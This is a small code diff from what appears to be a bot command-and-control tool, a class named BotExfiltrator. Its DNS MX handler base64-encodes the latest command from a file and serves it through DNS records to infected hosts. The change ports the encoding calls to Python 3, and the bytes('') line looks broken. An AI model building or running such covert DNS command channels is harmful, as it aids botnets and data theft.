@@ -67,9 +67,9 @@ class BotExfiltrator(DNSServer):
     def MX(self, name):
         try:
             with open(self.context['cmd']) as f:
-                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
+                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
         except:
-            cmd = base64.standard_b64encode('')
+            cmd = base64.standard_b64encode(bytes(''))
         return RR(name, QTYPE.MX, rdata=MX(cmd + "." + self.context['domain']), ttl=0)
 
 
